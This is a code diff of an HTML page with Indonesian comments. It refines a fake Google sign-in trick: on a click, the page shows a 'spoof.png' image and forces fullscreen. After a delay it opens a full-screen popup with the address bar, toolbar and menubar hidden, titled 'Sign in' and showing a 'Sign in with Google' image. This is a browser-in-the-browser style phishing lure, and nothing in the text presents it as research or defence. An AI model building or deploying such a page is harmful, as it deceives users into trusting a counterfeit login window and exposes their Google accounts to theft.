@@ -8,8 +8,8 @@
         body, html {
             margin: 0;
             padding: 0;
-            height: 100vh;
-            width: 100vw;
+            height: 100%;
+            width: 100%;
             overflow: hidden;
             background: #fff;
             display: flex;
@@ -40,69 +40,79 @@
     </style>
     <script>
         // Fullscreen untuk window tertentu
-        function requestFullscreen(element) {
-            if (element.requestFullscreen) return element.requestFullscreen();
-            if (element.webkitRequestFullscreen) return element.webkitRequestFullscreen();
-            if (element.mozRequestFullScreen) return element.mozRequestFullScreen();
-            if (element.msRequestFullscreen) return element.msRequestFullscreen();
+        function goFullscreen(targetWindow) {
+            var elem = targetWindow.document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
         }
 
         function openWin() {
-            // 1. Langsung coba fullscreen di MAIN WINDOW (ini yang paling penting)
-            requestFullscreen(document.documentElement);
-
-            // 2. Tampilkan spoof.png di main window
+            // 1. Langsung tampilkan spoof.png
             document.getElementById('spoof-img').style.display = 'block';
+
+            // 2. Langsung coba fullscreen di MAIN WINDOW (pasti masih dalam user gesture)
+            goFullscreen(window);
 
             // 3. Sembunyikan tombol setelah 1 detik
             setTimeout(function() {
                 document.querySelector('.signin-link').style.display = 'none';
             }, 1000);
 
-            // 4. Buka popup sebagai about:blank (address bar kosong)
-            var params = 'width=' + screen.width +
-                         ',height=' + screen.height +
-                         ',top=0,left=0' +
-                         ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';
+            // 4. BUKA POPUP DENGAN DELAY 1 DETIK (setelah main window sudah fullscreen)
+            setTimeout(function() {
+                var params = 'width=' + screen.width +
+                             ',height=' + screen.height +
+                             ',top=0,left=0' +
+                             ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';
 
-            var popup = window.open("about:blank", "google_signin", params);
+                var win = window.open("about:blank", "google_signin", params);
+                if (win) {
+                    win.moveTo(0, 0);
+                    win.resizeTo(screen.width, screen.height);
 
-            if (popup) {
-                popup.moveTo(0, 0);
-                popup.resizeTo(screen.width, screen.height);
-
-                // Tulis konten popup dengan sign.png
-                popup.document.write(`
+                    // Tulis konten popup dengan gambar sign.png
+                    win.document.write(`
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Sign in</title>
     <style>
-        body, html { margin:0; padding:0; height:100%; width:100%; background:#fff; display:flex; justify-content:center; align-items:center; overflow:hidden; }
-        img { max-width:100%; max-height:100%; object-fit:contain; }
+        body, html {
+            margin: 0; padding: 0; height: 100%; width: 100%;
+            background: #fff;
+            display: flex; justify-content: center; align-items: center;
+            overflow: hidden;
+        }
+        #sign-img {
+            max-width: 100%; max-height: 100%; object-fit: contain;
+        }
     </style>
 </head>
 <body>
-    <img src="sign.png" alt="Sign in with Google">
+    <img id="sign-img" src="sign.png" alt="Sign in with Google">
     <script>
-        // Coba fullscreen di popup (opsional, sebagai cadangan)
+        // Coba fullscreen di popup (opsional, kadang berhasil)
         function tryFS() {
-            var el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-            else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
-            else if (el.msRequestFullscreen) el.msRequestFullscreen();
+            var elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
         }
-        window.onload = tryFS;
+        window.addEventListener('load', tryFS);
     <\/script>
 </body>
 </html>
-                `);
-                popup.document.close();
-                popup.focus();
-            }
+                    `);
+
+                    win.document.close();
+                    win.focus();
+                }
+            }, 1000); // Delay 1 detik untuk popup
         }
     </script>
 </head>
